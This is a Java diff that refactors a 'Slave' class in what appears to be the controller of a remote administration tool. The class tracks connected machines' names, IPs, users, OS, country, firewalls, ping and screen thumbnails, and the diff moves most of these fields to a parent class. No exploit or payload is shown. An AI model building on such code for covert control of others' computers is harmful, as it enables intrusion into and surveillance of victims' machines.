@@ -56,16 +56,10 @@ public class Slave extends AbstractSlave {
 	private Firewall[] firewalls;
 
 	private String computername = "";
-	private String ip = "";
-	private String host = "";
-	private String serverid = "";
-	private String osname = "";
-	private String username = "";
 	private String serverpath = "";
 	private String javaver = "";
 	private String javapath = "";
 	private String localip = "";
-	private String version = "";
 	private String installdate = "";
 	private String renamedid = "";
 	private String country = "Unknown";
@@ -77,9 +71,6 @@ public class Slave extends AbstractSlave {
 
 	private int ram = 0;
 	private short processors;
-
-
-	private ImageIcon thumbnail = null;
 
 	public Slave(PortListener connection, Socket socket) {
 		super(connection, socket);
@@ -144,9 +135,7 @@ public class Slave extends AbstractSlave {
 				}
 
 				if (header == 0) {
-					long ping = System.currentTimeMillis() - pingms;
-					this.ping = (int) ping;
-					Frame.mainModel.setValueAt(ping + " ms", Utils.getRow(3, getIP()), 4);
+					pong();
 					continue;
 				}
 
@@ -172,8 +161,6 @@ public class Slave extends AbstractSlave {
 		}
 	}
 
-	
-
 	@Override
 	public boolean equals(Object o) {
 		if (o instanceof Slave) {
@@ -181,11 +168,6 @@ public class Slave extends AbstractSlave {
 		} else {
 			return false;
 		}
-	}
-
-	public OperatingSystem getOS() {
-		String os = this.getOperatingSystem().toLowerCase();
-		return OperatingSystem.getOperatingSystem(os);
 	}
 
 	public String getFileSeparator() {
@@ -202,18 +184,6 @@ public class Slave extends AbstractSlave {
 
 	public static String fix(String i) {
 		return i.split(" / ")[0];
-	}
-
-	public String getCountry() {
-		return country.toUpperCase();
-	}
-
-	public ImageIcon getFlag() {
-		return FlagUtils.getFlag(country);
-	}
-
-	public boolean isUpToDate() {
-		return getVersion().equals(Version.getVersion());
 	}
 
 	public List<String> getQueue() {
@@ -242,46 +212,6 @@ public class Slave extends AbstractSlave {
 
 	public void setComputerName(String name) {
 		this.computername = name;
-	}
-
-	public String getIP() {
-		return ip;
-	}
-
-	public void setIP(String ip) {
-		this.ip = ip;
-	}
-
-	public String getHost() {
-		return host;
-	}
-
-	public void setHost(String host) {
-		this.host = host;
-	}
-
-	public String getServerID() {
-		return serverid;
-	}
-
-	public void setServerID(String serverid) {
-		this.serverid = serverid;
-	}
-
-	public String getOperatingSystem() {
-		return osname;
-	}
-
-	public void setOperatingSystem(String osname) {
-		this.osname = osname;
-	}
-
-	public String getUsername() {
-		return username;
-	}
-
-	public void setUsername(String username) {
-		this.username = username;
 	}
 
 	public String getServerPath() {
@@ -314,14 +244,6 @@ public class Slave extends AbstractSlave {
 
 	public void setLocalIP(String localip) {
 		this.localip = localip;
-	}
-
-	public String getVersion() {
-		return version;
-	}
-
-	public void setVersion(String version) {
-		this.version = version;
 	}
 
 	public String getInstallDate() {
@@ -360,36 +282,12 @@ public class Slave extends AbstractSlave {
 		this.responded = responded;
 	}
 
-	public boolean isVerified() {
-		return verified;
-	}
-
-	public void setVerified(boolean verified) {
-		this.verified = verified;
-	}
-
 	public boolean isChecked() {
 		return checked;
 	}
 
 	public void setChecked(boolean checked) {
 		this.checked = checked;
-	}
-
-	public boolean isSelected() {
-		return selected;
-	}
-
-	public void setSelected(boolean selected) {
-		this.selected = selected;
-	}
-
-	public int getPing() {
-		return ping;
-	}
-
-	public void setPing(int ping) {
-		this.ping = ping;
 	}
 
 	public int getStatus() {
@@ -430,14 +328,6 @@ public class Slave extends AbstractSlave {
 
 	public void setReceived(long received) {
 		this.received = received;
-	}
-
-	public ImageIcon getThumbnail() {
-		return thumbnail;
-	}
-
-	public void setThumbnail(ImageIcon thumbnail) {
-		this.thumbnail = thumbnail;
 	}
 
 	public Locale[] getLocales() {
@@ -489,5 +379,10 @@ public class Slave extends AbstractSlave {
 	@Override
 	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
 		packet.send(this, dos);
+	}
+
+	@Override
+	public String getDisplayName() {
+		return getComputerName() + " / " + getIP();
 	}
 }
